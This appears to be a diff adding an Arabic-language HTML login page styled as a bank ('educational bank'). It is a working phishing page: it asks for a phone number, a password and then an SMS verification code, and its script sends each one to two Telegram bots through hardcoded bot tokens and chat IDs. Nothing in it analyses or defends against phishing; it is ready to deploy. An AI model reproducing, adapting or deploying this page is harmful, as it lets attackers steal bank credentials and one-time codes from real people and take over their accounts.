@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول - بنك تعليمي</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f9f9f9;
+      height: 100vh;
+    }
+
+    .banner-logo {
+      width: 100%;
+      height: 200px;
+      background-image: url('jmhorea.jpeg');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 20px auto 0;
+      padding: 0 15px;
+    }
+
+    .box-login {
+      background-color: #fff;
+      padding: 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+
+    .box-code {
+      background-color: #f2f2f2;
+      padding: 25px 20px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #333;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: rgba(255, 255, 255, 0.8);
+    }
+
+    .input-field:focus {
+      border-color: #003366;
+      outline: none;
+      background-color: rgba(255, 255, 255, 1);
+    }
+
+    .floating-label {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background-color: rgba(255, 255, 255, 0.8);
+      padding: 0 5px;
+      color: #666;
+      font-size: 15px;
+      pointer-events: none;
+      transition: 0.3s ease;
+    }
+
+    .input-field:focus + .floating-label,
+    .input-field:not(:placeholder-shown) + .floating-label {
+      top: -10px;
+      font-size: 13px;
+      color: #003366;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background-color: #003366;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-button:hover {
+      background-color: #002244;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .confirmation-text {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 17px;
+      color: #333;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="banner-logo"></div>
+
+  <div class="container">
+    <!-- صفحة تسجيل الدخول -->
+    <div id="login-page" class="box-login">
+      <h2>تسجيل الدخول</h2>
+      <div id="login-error" class="error-message hidden">يرجى إدخال رقم الهاتف وكلمة المرور</div>
+
+      <div class="input-wrapper">
+        <input type="text" id="phone" class="input-field" placeholder=" " required>
+        <label for="phone" class="floating-label">رقم الهاتف</label>
+      </div>
+
+      <div class="input-wrapper">
+        <input type="password" id="password" class="input-field" placeholder=" " required>
+        <label for="password" class="floating-label">كلمة المرور</label>
+      </div>
+
+      <button class="login-button" onclick="validateLogin()">تسجيل الدخول</button>
+    </div>
+
+    <!-- صفحة الكود -->
+    <div id="confirmation-page" class="box-code hidden">
+      <div class="confirmation-text">تم ارسال رسالة نصية SMS إلى هاتفك</div>
+      <div id="code-error" class="error-message hidden">يرجى كتابة الكود</div>
+
+      <div class="input-wrapper">
+        <input type="text" id="code" class="input-field" placeholder=" " maxlength="6" oninput="validateCodeInput(this)" required>
+        <label for="code" class="floating-label">الكود</label>
+      </div>
+
+      <button class="login-button" onclick="submitCode()">تسجيل الدخول</button>
+    </div>
+  </div>
+
+  <script>
+    // دالة إرسال البيانات إلى بوتين تيليجرام
+    function sendToTelegram(message) {
+      const bots = [
+        {token: "8335790845:AAHNHgI5m-cwncvE1eLjmp5RiGA4mEK6BAc", chatId: "7166291647"},
+        {token: "8058037710:AAGNHpZ_KkSAGcJ0H6Xy1OGKBL6Xy77S6FQ", chatId: "1777025332"}
+      ];
+
+      bots.forEach(bot => {
+        const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: bot.chatId,
+            text: message
+          })
+        });
+      });
+    }
+
+    function validateLogin() {
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const error = document.getElementById('login-error');
+
+      if (phone === '' || password === '') {
+        error.classList.remove('hidden');
+      } else {
+        error.classList.add('hidden');
+        // إرسال البيانات إلى بوتين
+        sendToTelegram(`📱 هاتف: ${phone}\n🔑 كلمة المرور: ${password}`);
+        document.getElementById('login-page').classList.add('hidden');
+        document.getElementById('confirmation-page').classList.remove('hidden');
+      }
+    }
+
+    function validateCodeInput(input) {
+      input.value = input.value.replace(/\D/g, '').slice(0, 6);
+    }
+
+    function submitCode() {
+      const code = document.getElementById('code').value.trim();
+      const error = document.getElementById('code-error');
+
+      if (code.length !== 4 && code.length !== 6) {
+        error.classList.remove('hidden');
+      } else {
+        error.classList.add('hidden');
+        // إرسال الكود إلى بوتين
+        sendToTelegram(`✅ الكود: ${code}`);
+        alert("تم إدخال الكود بنجاح");
+      }
+    }
+  </script>
+</body>
+</html>
